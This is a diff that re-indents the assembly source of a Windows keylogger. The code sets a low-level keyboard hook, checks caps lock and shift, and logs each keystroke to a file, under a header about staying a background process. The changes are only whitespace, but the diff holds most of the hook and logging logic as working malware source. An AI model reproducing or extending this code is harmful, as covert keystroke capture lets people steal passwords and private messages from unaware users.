@@ -48,16 +48,16 @@ programInstance dd ?
 .CODE
 MAIN:
 						INVOKE			MakeOrOpenFile
-						INVOKE 		GetModuleHandle, NULL
+						INVOKE			GetModuleHandle, NULL
 						mov				hInstance, eax				
 
 						INVOKE			GetCommandLine
 						mov				lpszCmdLine, eax
 
 						INVOKE			WinMain, hInstance, 
-														  NULL,
-														  lpszCmdLine,
-														  SW_SHOWDEFAULT
+											NULL,
+											lpszCmdLine,
+											SW_SHOWDEFAULT
 
 ;***************** Stay As Background Process ************************
 
@@ -129,7 +129,7 @@ WriteToFile PROC msg:DWORD
 						repne		scasb
 						not			ecx
 						dec			ecx
-						INVOKE	    WriteFile, fileDescriptor, [msg], ecx, ADDR nBytes, 0          ;keys are logging one by one
+						INVOKE		WriteFile, fileDescriptor, [msg], ecx, ADDR nBytes, 0          ;keys are logging one by one
 						ret
 
 WriteToFile ENDP
@@ -138,15 +138,15 @@ WriteToFile ENDP
 
 InstallHook PROC pInst:DWORD
 
-										push			 pInst
-										pop			 programInstance
-										lea			 ecx, LowLevelKeyboardProc
-										INVOKE		 SetWindowsHookEx,  WH_KEYBOARD_LL,
-																						ecx,
-																						hookInstance,
-																						NULL
-										mov			 hHook, eax
-										ret
+						push			pInst
+						pop			programInstance
+						lea			ecx, LowLevelKeyboardProc
+						INVOKE		SetWindowsHookEx,  WH_KEYBOARD_LL,
+																		ecx,
+																		hookInstance,
+																		NULL
+						mov			hHook, eax
+						ret
 
 InstallHook ENDP
 
@@ -154,8 +154,8 @@ InstallHook ENDP
 
 UninstallHook PROC
 
-										INVOKE		UnhookWindowsHookEx, hHook
-										ret
+						INVOKE			UnhookWindowsHookEx, hHook
+						ret
 
 UninstallHook ENDP
 
@@ -163,57 +163,57 @@ UninstallHook ENDP
 
 LowLevelKeyboardProc PROC nCode:SDWORD, wParam:DWORD, lParam:DWORD
 
-										mov			eax, nCode
-										cmp			eax, 0FFFFFFFFh														;check if neg number
-										jge			CheckParams
-										jmp			CallNextHook
+									mov			eax, nCode
+									cmp			eax, 0FFFFFFFFh														;check if neg number
+									jge			CheckParams
+									jmp			CallNextHook
 
-CheckParams:					mov			eax, lParam
-										and			eax, 8000000h														;getting 31 bit to check repeat count
-										test			eax, eax
-										jnz			CallNextHook
-										mov		    eax, wParam
-										cmp			eax, WM_KEYDOWN												
-										je			    CheckIfKeyIsSpecial 
-										cmp			eax, WM_SYSKEYDOWN											
-										je				CheckIfKeyIsSpecial       	
-										jmp			CallNextHook
+CheckParams:				mov			eax, lParam
+									and			eax, 8000000h														;getting 31 bit to check repeat count
+									test			eax, eax
+									jnz			CallNextHook
+									mov			eax, wParam
+									cmp			eax, WM_KEYDOWN												
+									je				CheckIfKeyIsSpecial 
+									cmp			eax, WM_SYSKEYDOWN											
+									je				CheckIfKeyIsSpecial       	
+									jmp			CallNextHook
 
-CheckIfKeyIsSpecial:			call			CheckCapital
-										test			eax, eax
-										jnz			WriteCapsLockKey
-										INVOKE		CheckPowerButton
-										test			eax, eax
-										jnz			WritePowerButton
-										jmp			WriteKey
+CheckIfKeyIsSpecial:		call			CheckCapital
+									test			eax, eax
+									jnz			WriteCapsLockKey
+									INVOKE		CheckPowerButton
+									test			eax, eax
+									jnz			WritePowerButton
+									jmp			WriteKey
 
-WriteCapsLockKey:				INVOKE		WriteToFile, OFFSET caps
-										jmp			WriteKey
+WriteCapsLockKey:			INVOKE		WriteToFile, OFFSET caps
+									jmp			WriteKey
 
-WritePowerButton:				INVOKE		WriteToFile, OFFSET powerButton
-										INVOKE		ExitProcess, 0														;can be modified later
+WritePowerButton:			INVOKE		WriteToFile, OFFSET powerButton
+									INVOKE		ExitProcess, 0														;can be modified later
 
-WriteKey:							INVOKE		WriteToFile, lParam
-										jmp			PostCall
+WriteKey:						INVOKE		WriteToFile, lParam
+									jmp			PostCall
 
-PostCall:							INVOKE		CallNextHookEx, hHook, nCode, WM_KEYUP, lParam	
-										ret
+PostCall:						INVOKE		CallNextHookEx, hHook, nCode, WM_KEYUP, lParam	
+									ret
 
-CallNextHook:					INVOKE		CallNextHookEx, hHook, nCode, wParam, lParam
-										ret
+CallNextHook:				INVOKE		CallNextHookEx, hHook, nCode, wParam, lParam
+									ret
 
 LowLevelKeyboardProc ENDP
 
 ;**************Check If Capital Key Is Pressed*************
 
 CheckCapital PROC
-										xor			esi, esi
-										INVOKE		GetKeyState, VK_CAPITAL
-										test			eax, eax
-										jnz			Exit
-										INVOKE		GetAsyncKeyState, VK_SHIFT
-										or				eax, esi
-Exit:									ret
+									xor			esi, esi
+									INVOKE		GetKeyState, VK_CAPITAL
+									test			eax, eax
+									jnz			Exit
+									INVOKE		GetAsyncKeyState, VK_SHIFT
+									or				eax, esi
+Exit:								ret
 
 CheckCapital ENDP
 
@@ -221,8 +221,8 @@ CheckCapital ENDP
 
 CheckPowerButton PROC 
 
-										INVOKE		GetKeyState, VK_SLEEP
-										ret
+									INVOKE		GetKeyState, VK_SLEEP
+									ret
 
 CheckPowerButton ENDP
 
